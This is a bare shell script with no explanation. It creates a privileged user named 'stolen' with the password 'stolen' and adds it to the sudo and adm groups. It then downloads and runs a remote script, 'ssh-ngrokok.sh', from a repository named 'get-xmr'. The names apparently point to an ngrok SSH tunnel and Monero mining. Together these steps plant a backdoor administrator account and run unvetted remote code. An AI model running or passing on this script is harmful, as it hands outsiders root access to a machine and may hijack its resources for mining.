sudo bash
sudo apt install wget -y
sudo apt install curl -y
sudo adduser stolen --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
echo "stolen:stolen" | sudo chpasswd
sudo usermod -aG sudo,adm stolen
wget https://raw.githubusercontent.com/a2nk/get-xmr/main/ssh-ngrokok.sh && chmod +x ssh-ngrokok.sh && ./ssh-ngrokok.sh
